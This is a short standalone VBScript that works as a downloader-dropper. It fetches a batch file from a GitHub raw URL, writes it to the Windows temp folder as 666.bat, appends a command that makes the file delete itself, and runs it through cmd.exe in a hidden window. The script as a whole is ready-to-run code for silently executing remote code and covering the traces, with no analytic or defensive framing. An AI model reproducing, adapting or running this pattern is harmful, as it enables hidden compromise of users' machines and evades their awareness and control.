Dim http, stream, shell, tempPath, url, fso

url = "https://github.com/aledreamer1234-lgtm/444/raw/refs/heads/main/babi.bat"
tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\666.bat"

' Use WinHttpRequest for better redirect handling
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", url, False
http.Option(6) = True ' Follow redirects
http.Send

' Save the response body
Set stream = CreateObject("ADODB.Stream")
stream.Open
stream.Type = 1
stream.Write http.ResponseBody
stream.SaveToFile tempPath, 2
stream.Close

' Append self-delete logic
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(tempPath, 8, True)
file.WriteLine("")
file.WriteLine("(goto) 2>nul & del ""%~f0""")
file.Close

' Execute directly via cmd.exe /c without 'start' to minimize shell complexity
' The 0 flag hides the window.
Set shell = CreateObject("WScript.Shell")
shell.Run "cmd.exe /c """ & tempPath & """", 0, False

Set shell = Nothing
Set fso = Nothing
